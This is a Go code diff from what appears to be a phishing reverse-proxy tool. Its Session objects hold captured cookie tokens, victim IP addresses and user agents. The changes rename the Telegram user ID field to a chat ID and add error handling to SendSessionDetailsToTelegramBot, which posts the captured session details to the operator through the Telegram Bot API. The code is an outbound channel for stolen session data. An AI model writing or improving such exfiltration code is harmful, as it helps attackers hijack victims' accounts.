@@ -13,8 +13,8 @@ import (
 
 	//"os"
 	"regexp"
+	"strings"
 
-	//"strings"
 	"time"
 
 	//"io/fs"
@@ -45,7 +45,7 @@ type Session struct {
 	RemoteAddr       string
 	UserAgent        string
 	TelegramBotToken string
-	TelegramUserID   string
+	TelegramChatID   string
 }
 
 func getConfigValue(key string) string {
@@ -75,7 +75,7 @@ func NewSession(name string, cfg *Config) (*Session, error) {
 		RemoteAddr:       "",
 		UserAgent:        "",
 		TelegramBotToken: cfg.GetTelegramBotToken(),
-		TelegramUserID:   cfg.GetTelegramUserID(),
+		TelegramChatID:   cfg.GetTelegramUserID(),
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -195,34 +195,44 @@ func (s *Session) SendSessionDetailsToTelegramBot() {
 	fmt.Println("Session message:", stripHTMLTags(sessionMessage))
 
 	// Check if Telegram bot token and user ID are set
-	if s.TelegramBotToken == "" || s.TelegramUserID == "" {
+	if s.TelegramBotToken == "" || s.TelegramChatID == "" {
 		log.Warning("Telegram bot token or user ID not set. Telegram notifications are disabled.")
 		return
 	}
 
 	// Send session details to Telegram bot
-	go SendFormattedMessageToTelegramBot(sessionMessage, s.TelegramBotToken, s.TelegramUserID)
+	go SendFormattedMessageToTelegramBot(sessionMessage, s.TelegramBotToken, s.TelegramChatID)
 }
 
 // SendFormattedMessageToTelegramBot sends an HTML-formatted message to a Telegram bot
-func SendFormattedMessageToTelegramBot(message, botToken, userID string) {
+func SendFormattedMessageToTelegramBot(message, botToken, chatID string) {
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
 
 	data := url.Values{}
-	data.Set("chat_id", userID)
+	data.Set("chat_id", chatID)
 	data.Set("text", message)
 	data.Set("parse_mode", "HTML")
 
 	resp, err := http.PostForm(apiURL, data)
 	if err != nil {
-		fmt.Println("Error sending message to Telegram bot:", err)
+		log.Error("Error sending message to Telegram bot: %v", err)
 		return
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
-		fmt.Printf("Unexpected status code: %d, response: %s\n", resp.StatusCode, string(bodyBytes))
+		log.Error("Telegram API error (status code %d): %s", resp.StatusCode, string(bodyBytes))
+
+		// Check for common errors
+		errorMsg := string(bodyBytes)
+		if strings.Contains(errorMsg, "chat not found") {
+			log.Error("Telegram chat ID '%s' not found. Make sure the bot is added to the group/channel if using group/channel ID", chatID)
+		} else if strings.Contains(errorMsg, "bot was blocked by the user") {
+			log.Error("Telegram bot was blocked by the user with ID '%s'", chatID)
+		} else if strings.Contains(errorMsg, "bot is not a member") {
+			log.Error("Telegram bot is not a member of the chat '%s'. Add the bot to the group/channel", chatID)
+		}
 	}
 }
 
